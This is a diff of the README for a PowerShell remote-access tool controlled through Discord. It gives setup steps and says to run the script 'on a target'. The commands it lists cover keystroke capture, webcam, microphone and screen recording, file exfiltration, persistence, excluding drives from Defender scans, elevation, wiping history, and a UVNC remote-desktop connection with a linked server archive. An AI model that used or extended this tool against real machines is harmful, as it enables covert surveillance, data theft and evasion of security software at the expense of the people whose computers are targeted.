@@ -26,47 +26,37 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 4. add the bot to your discord server
 5. Click 'Reset Token' in "Bot" tab for your token
 6. Change $tk below with your bot token
-7. Change $ch below to the channel id of your channel.
 
 **USAGE**
 1. Setup the script
 2. Run the script on a target.
-3. Check discord for 'waiting to connect..' message.
-4. Type the computers name into chat to start a session
-5. The session will be started in a newly created channel - (unles you use -nonew to use the maseter channel eg. `DESKTOP-3DG5fS -nonew`) 
-6. Use the commands listed below
+3. Check discord for new channels created.
+5. The session will be started in a newly created channel category 
+6. Use the commands listed below in 'session-control' channel
 
 **MODULES / COMMANDS**
 
-*Write these in chat to run on the target.*
+*Write these in 'session-control' channel to run on the target.*
 
-- **SpeechToText**: Send audio transcript to Discord
-- **QuickInfo**: Send a quick System info embed (sent on first connect)
-- **Systeminfo**: Send System info as text file to Discord
-- **FolderTree**: Save folder trees to file and send to Discord
-- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
-- **NearbyWifi**: Show nearby wifi networks (!user popup!)
-- **ChromeDB**:  Gather Database files from Chrome and send to Discord (view them in DBBrowser.exe)
-
+-SYSTEM
 - **AddPersistance**: Add this script to startup.
 - **RemovePersistance**: Remove Poshcord from startup
 - **IsAdmin**: Check if the session is admin
 - **Elevate**: Attempt to restart script as admin (!user popup!)
 - **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
 - **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
-- **EnableRDP**: Enable Remote Desktop on target.
-- **EnableIO**: Enable Keyboard and Mouse
-- **DisableIO**: Disable Keyboard and Mouse
-
-- **RecordAudio**: Record microphone and send to Discord
-- **RecordScreen**: Record Screen and send to Discord
-- **TakePicture**: Send a webcam picture and send to Discord
+- **EnableIO**: Enable Keyboard and Mouse (admin only)
+- **DisableIO**: Disable Keyboard and Mouse (admin only)
 - **Exfiltrate**: Send various files. (see ExtraInfo)
-- **Upload**: Upload a file from connected machine. (see ExtraInfo)
-- **Download**: Download a file to the current directory on the client. (attach a file with the command)
-- **Screenshot**: Sends a screenshot of the desktop and send to Discord
-- **Keycapture**: Capture Keystrokes and send to Discord
+- **Upload**: Upload a file. (see ExtraInfo)
+- **Download**: Download a file. (attach a file with the command)
+- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
+- **SpeechToText**: Send audio transcript to Discord
+- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
+- **NearbyWifi**: Show nearby wifi networks (!user popup!)
+- **RecordScreen**: Record Screen and send to Discord
 
+-PRANKS
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
 - **Windows93**: Start parody Windows93 using Chrome
 - **WindowsIdiot**: Start fake Windows95 using Chrome
@@ -76,21 +66,25 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 - **VoiceMessage**: Send a message window to the User (!user popup!)
 - **MinimizeAll**: Send a voice message to the User
 - **EnableDarkMode**: Enable System wide Dark Mode
-- **DisableDarkMode**: Disable System wide Dark Mode\
-- **VolumeMax**: Maximise System Volume
-- **VolumeMin**: Minimise System Volume
+- **DisableDarkMode**: Disable System wide Dark Mode
 - **ShortcutBomb**: Create 50 shortcuts on the desktop.
 - **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
 - **Goose**: Spawn an annoying goose (Sam Pearson App)
+- **ScreenParty**: Start A Disco on screen!
+  
+-JOBS
+- **Microphone**: Record microphone clips and send to Discord
+- **Webcam**: Stream webcam pictures to Discord
+- **Screenshots**: Sends screenshots of the desktop to Discord
+- **Keycapture**: Capture Keystrokes and send to Discord
+- **SystemInfo**: Gather System Info and send to Discord
 
+-CONTROL
 - **ExtraInfo**: Get a list of further info and command examples
 - **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
-- **Kill**: Stop a running module (eg. Keycapture / Exfiltrate)
-- **ControlAll**: Control all waiting sessions simultaneously
-- **ShowAll**: Control all waiting sessions simultaneously
-- **Pause**: Pause the current authenticated session
+- **Kill**: Stop a running module (eg. Exfiltrate)
+- **PauseJobs**: Pause the current jobs for this session
 - **Close**: Close this session
-
 
 **FEATURES**
 
@@ -98,12 +92,9 @@ Every 10 seconds it will check for a new message in chat and interpret it as a c
 
 You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat
 
-**Mass Control Mode**
-
-Control all waiting sessions simultaneously with 'controll-all' to mass authenticate sessions.
-
 **Killswitch**
 
 Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
 
-# If you like my work please leave a star. ⭐
+**UVNC Listener / Server**
+Zip File - https://github.com/wormserv/assets/raw/main/uvnc-server.zip
